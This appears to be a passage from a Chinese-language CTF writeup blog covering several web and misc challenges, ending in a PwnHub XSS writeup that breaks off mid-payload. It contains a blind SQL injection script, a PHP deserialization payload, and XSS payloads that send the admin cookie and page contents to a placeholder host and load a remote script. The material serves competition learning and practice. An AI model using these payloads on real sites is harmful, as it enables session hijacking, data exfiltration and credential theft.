class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">"CONTENT-TYPE:text/html;charset=UTF-8"</span>);</span><br><span class="line">define(<span class="string">"HOST"</span>,<span class="string">"127.0.0.1"</span>);</span><br><span class="line">define(<span class="string">"USERNAME"</span>,<span class="string">"root"</span>);</span><br><span class="line">define(<span class="string">"PASSWORD"</span>,<span class="string">""</span>);</span><br><span class="line">$con=<span class="keyword">new</span> mysqli(HOST,USERNAME,PASSWORD,<span class="string">"ctf1"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"aaaa"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$con-&gt;select_db(<span class="string">"ctf1"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$con-&gt;query(<span class="string">"SET NAMES utf8"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $con-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$xss=$_POST[<span class="string">"sub"</span>];</span><br><span class="line">$str = addslashes($xss);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**********获取IP************/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_outer</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        $url = <span class="string">'http://www.ip138.com/ip2city.asp'</span>;  </span><br><span class="line">        $info = file_get_contents($url);  </span><br><span class="line">        preg_match(<span class="string">'|&lt;center&gt;(.*?)&lt;/center&gt;|i'</span>, $info, $m);  </span><br><span class="line">        <span class="keyword">return</span> $m[<span class="number">1</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_inter</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        $onlineip = <span class="string">''</span>;  </span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = getenv(<span class="string">'REMOTE_ADDR'</span>);  </span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;  </span><br><span class="line">            $onlineip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> $onlineip;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$p = <span class="keyword">new</span> Action();</span><br><span class="line">$intip = $p-&gt;get_inter();</span><br><span class="line">$outip2= $intip;</span><br><span class="line">@mkdir(<span class="string">"/tmp/ids"</span>,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">$sql=<span class="string">"insert into ctf1(xss,ip,time,wai_ip) values('$str','$intip',NOW(),'$outip2')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($str=$con-&gt;query($sql))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('success');window.location.href='index.php'&lt;/script&gt;"</span>;</span><br><span class="line">    $insertid = mysqli_insert_id($con);</span><br><span class="line">    file_put_contents(<span class="string">"/tmp/ids/"</span>.$insertid,<span class="string">"a"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('fail');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后根据扫描得到的 readme 的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">修改根目录l.php</span><br><span class="line">1.修改相关Web容器信息</span><br><span class="line">2.修改物理路径为linux路径</span><br><span class="line">3.删除windows关键字</span><br><span class="line">部署完成后删除根目录sql.sql、flag、pass文件</span><br><span class="line">默认数据库密码为空，数据库名为ctf1</span><br><span class="line"></span><br><span class="line">需要写的脚本</span><br><span class="line">1.数据库中每增加一条ID，访问一次</span><br></pre></td></tr></table></figure></p><p>猜测是有 xss 的，可以看到插入数据库的 xss 字段是用户 POST 传进来的 sub 参数，只进行了转义。那么随便写入一个 <code>&lt;img src=your_xss_platform&gt;</code>，之后就在 xss 平台中收到了 referer 值 <code>admin/b9557ee76eeb61cadda090855a47d266-1.php?id=77930</code>，ssrf 打下这个，是自动访问数据库新增信息的脚本，里面有个 js.php，访问下就拿到了 flag</p><h3 id="CloverSecLogos-500"><a href="#CloverSecLogos-500" class="headerlink" title="CloverSecLogos - 500"></a>CloverSecLogos - 500</h3><p>存在 index.php 和 picture.php<br>其中 picture.php 存在 id=1 的 get 请求，应该是存在注入的，FUZZ 下可以得出 and or 空格 # 都被替换成了空，因为提示给了表名 user，字段名 username 和 password，所以写个脚本盲注就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">HTTP GET</span></span><br><span class="line"><span class="string">盲注</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">li = string.digits + string.ascii_letters</span><br><span class="line">url = <span class="string">'http://60.191.205.80/picture.php?id='</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span><span class="params">()</span>:</span></span><br><span class="line">    database = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26substring(DATABASE(),'</span> + str(i+<span class="number">1</span>) + <span class="string">',1)="'</span> + c</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                database += c</span><br><span class="line">                <span class="keyword">print</span> database</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current database is '</span> + database</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUsername</span><span class="params">()</span>:</span>  </span><br><span class="line">    username = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26(select(substring(username,'</span> + str(i+<span class="number">1</span>) + <span class="string">',1))from(user)where(id=1))="'</span> + c</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                username += c</span><br><span class="line">                <span class="keyword">print</span> username</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current username is '</span> + username</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> li:</span><br><span class="line">            payload = <span class="string">'1"%26%26(select(substring(passwoorrd,'</span> + str(i+<span class="number">1</span>) + <span class="string">',1))from(user)where(id=1))="'</span> + str(c)</span><br><span class="line">            <span class="keyword">if</span>(getData(payload)):</span><br><span class="line">                password += c</span><br><span class="line">                <span class="keyword">print</span> password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] The current password is '</span> + password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Picture  not found!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># getDatabase()</span></span><br><span class="line">    getUsername()</span><br><span class="line">    getPassword()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>得到用户名 admin，密码 14aceb3fc5992cef3d97，这个有20位，是 dedecms 的加密方式，去掉前三后一后解 md5 得到 admin^g<br>然后可以登录了，根据提示有备份文件，拿到源码<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($Username==<span class="string">"Anonymous"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'xxx'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'xxx'</span>;</span><br><span class="line">    $sql=<span class="string">'select * from user where `username`="'</span>.$Username.<span class="string">'"'</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    $imformation=mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])&amp;&amp;$_GET[<span class="string">'action'</span>]==<span class="string">'imformation'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'token'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $secret=$_GET[<span class="string">'secret'</span>];</span><br><span class="line">            $token =$_COOKIE[<span class="string">'token'</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($secret)&amp;&amp;(file_get_contents($secret,<span class="string">'r'</span>)===<span class="string">"1234"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"hello Hacker!&lt;br&gt;"</span>; </span><br><span class="line">                <span class="keyword">include</span>(<span class="string">"include.php"</span>);</span><br><span class="line">                <span class="keyword">echo</span> ssctf_unserialize($token); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"You are not Hacker ! "</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            setcookie(<span class="string">"token"</span>,<span class="string">''</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;h2 style="text-align:center;"&gt;Welcome&lt;/h2&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;div&gt;&lt;h4&gt;User imformation&lt;/h4&gt;&lt;ul&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;li&gt;Username : '</span>.$imformation[<span class="string">'username'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $html=<span class="string">'&lt;h1&gt;Welcome CloverSec Labs&lt;/h1&gt;'</span>;</span><br><span class="line">        $html=$html.<span class="string">'&lt;p&gt; Hacking it! &lt;/p&gt;'</span>;</span><br><span class="line">        $html=$html.<span class="string">'&lt;a class="btn btn-primary btn-large" href="#SleepZZZzzz"&gt;SleepzzzZZZ&lt;/a&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>include.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//ssctf_flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">"ssctf_flag.php"</span>===<span class="keyword">$this</span>-&gt;file)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            &#125;</span><br><span class="line">               </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"you are big Hacker"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ssctf_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value,$matches);</span><br><span class="line">        <span class="keyword">if</span>(count($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unserialize($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到登录后就很简单了，通过反序列化读取 flag 文件，过滤了 <code>[oc]:\d+:</code> ，但是 o:+4 这样也是可以的。文件名的过滤可以用 ./，或者用 php 伪协议，最终的 payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://60.191.205.80?action=imformation&amp;secret=php://input</span><br><span class="line"></span><br><span class="line">1234</span><br><span class="line"></span><br><span class="line">token O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:16:&quot;./ssctf_flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="互相伤害！！！-150"><a href="#互相伤害！！！-150" class="headerlink" title="互相伤害！！！ - 150"></a>互相伤害！！！ - 150</h3><p>题目给了一个流量包，从中可以导出 21 个表情包，然后 <code>binwalk -e *</code>，得到了一张二维码和一个有密码的压缩包。其中二维码扫描出来是 <code>扔下内衣真的有一线生机？交出内裤才有活路。</code>。之前的表情包里有一张改掉的你尽管做，做出来算我输的表情，上面有个二维码，扫下得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+VpmdLwwhbyNU80MDlK+8t61sewce2qCVztitDMKpQ4fUl5nsAZOI7 bE9uL8lW/KLfbs33aC1XXw==</span><br></pre></td></tr></table></figure></p><p>base64 解密下，开头是 <code>Salted__</code>，谷歌下是 AES 加密后的格式，那么只要知道秘钥就能得到明文了，试了半天，结果是表情上的红字 CTF ==，然后可以直接用 openssl 来解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes256 -d -in c1 -out c1.enc -base64</span><br></pre></td></tr></table></figure></p><p>用这个网站也可以直接解出来 <a href="http://tool.oschina.net/encrypt" target="_blank" rel="external">http://tool.oschina.net/encrypt</a><br>解出来的结果就是压缩包的密码，得到一张图片，中间有个小的二维码，反色扫下就拿到 flag 了</p><h3 id="我们的秘密是绿色的-200"><a href="#我们的秘密是绿色的-200" class="headerlink" title="我们的秘密是绿色的 - 200"></a>我们的秘密是绿色的 - 200</h3><p>一时失忆了，上次刚做了陕西比赛的一道题叫 我们的秘密，就是拿 our secret 这个软件来解的，这个也是这样 ==，当时只是瞟了一眼 wp 就没管了<br>根据绿色的，图片中的日历上有几个数字是绿色的，这就是解密密码，得到 try.zip，windows 下用解压软件打开是可以看到注释的 <code>你知道coffee的生日是多少</code>，linux 下反正直接打开是看不到的，不知道有什么软件可以实现。爆破 8 位数字，然后解压得到 flag.zip 和 readme.txt，然后 flag.zip 里也有一个 readme.txt，那么应该是明文攻击了。用 ARPH 软件跑了两分钟得到了里面的文件，没记错的话再伪加密就是 flag 了(据说好压可以无视伪加密，可以直接提取出文件)</p><h3 id="你知道我在等你吗-300"><a href="#你知道我在等你吗-300" class="headerlink" title="你知道我在等你吗 - 300"></a>你知道我在等你吗 - 300</h3><p>题目给了一个压缩包里面有这三个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你知道我在等你吗.mp3</span><br><span class="line">提示.png</span><br><span class="line">coffee.zip</span><br></pre></td></tr></table></figure></p><p>Strings 一下 mp3，可以得到一个字符串 falg<em>config</em>@tl_<br>试了下是 coffee.zip 的密码，获得一张 coffee.jpg</p><p>扫下提示.png中的二维码，得到 神龙摆尾（ps:不是让你看内容！！！）<br>本来以为是 LSB，结果不是，然后看下 coffee.jpg，发现文件尾是 png 的文件尾 <code>AE 42 60 82</code>，可能是两张图片合了起来，搜下 jpg 的文件尾标志 <code>FF D9</code>，果然后面是有 IHDR 标志的，但是 png 的文件头被改成了 coffee，我们把它改好得到一张二维码图片，扫下又得到一个 txt 文件，是一个 zip 压缩包，有密码，是伪加密，把 01 改为 00 就可以了，然后 base64 解密，提交括号里的就可以了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;捡吗？-100&quot;&gt;&lt;a href=&quot;#捡吗？-100&quot; class=&quot;headerlink&quot; title=&quot;捡吗？ - 1
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="writeup" scheme="http://heartsky.info/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>PwnHub 绝对防御 writeup</title>
    <link href="http://heartsky.info/2017/04/25/PwnHub-%E7%BB%9D%E5%AF%B9%E9%98%B2%E5%BE%A1-writeup/"/>
    <id>http://heartsky.info/2017/04/25/PwnHub-绝对防御-writeup/</id>
    <published>2017-04-24T17:29:20.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>一道土师傅出的 xss 的题，因为一些细节没理解，没做出来，不过还是学到了挺多知识的。</p><p>打开页面，是一个留言板，有注册和登录功能，因为已经说了有 bot ，就不考虑 sql 注入的问题了。随便注册个账号登录进去可以发现是一个留言的功能，给自己留言得到 <code>script</code> <code>on</code> 会被替换为空，可以双写绕过，根据题目的说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin 刚刚完成了聊天版，会经常和大家聊天。</span><br><span class="line">http://52.80.63.91/</span><br></pre></td></tr></table></figure></p><p>应该是要先打下管理员的 cookie<br>看下 csp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;; style-src &apos;self&apos; &apos;unsafe-inline&apos;;</span><br></pre></td></tr></table></figure></p><p>可以执行 script 标签，发送下面的信息得到管理员 cookie<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>locatioonn.href="http://xxx?cookie="+document.cookie<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>(后来才发现我们的 cookie 都是 httponly，但是 bot 不是<br>xxx 是你的服务器或者 xss 平台地址<br>更改 cookie 登录管理员账号得到下面的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow, good guys,maybe you want /adminshigesha233e3333#admin</span><br></pre></td></tr></table></figure></p><p>手动访问了下，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,admin maybe something in flag.php</span><br></pre></td></tr></table></figure></p><p>再去访问 flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello, hacker, only admin can see it</span><br></pre></td></tr></table></figure></p><p>那么就要管理员请求才可以喽，用下面的 payload 让 admin 请求 flag.php<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open("GET", 'http://52.80.63.91/adminshigesha233e3333/flag.php', true);</span><br><span class="line">xhr.oonnreadystatechange = functioonn()</span><br><span class="line">&#123;</span><br><span class="line">if(xhr.readyState == 4)</span><br><span class="line">&#123;</span><br><span class="line">var text = xhr.respoonnseText;</span><br><span class="line">document.locatioonn = "http://xxx?a=text";</span><br><span class="line">&#125;</span><br><span class="line">xhr.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nothing here,╮(╯-╰)╭,what ever you try, only from adminshigesha233e3333 can read it...</span><br></pre></td></tr></table></figure></p><p>一开始以为要设置 referer 头，用 xhr 的 setRequestHeader 设置但是没用<br>想到#后面的 admin，感觉有点奇怪，去看了下源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'MO0VrFHgESrb'</span>&gt;</span><span class="undefined">document.write('Hello,' + unescape(location.hash.substring(1)) + '\r\n maybe something in flag.php')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'MO0VrFHgESrb'</span>&gt;</span><span class="undefined">console.log('bad boy!!')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到是获取了#后面的值，并用 document.write 输出了出来，因为代码是在一行的，所以有了第一种方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.80.63.91/adminshigesha233e3333/#&lt;script src=http://xxx/hack.js</span><br></pre></td></tr></table></figure></p><p>这样就构造出了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src="http://xxx/hack.js" maybe="" something="" in="" flag.php&lt;script="" 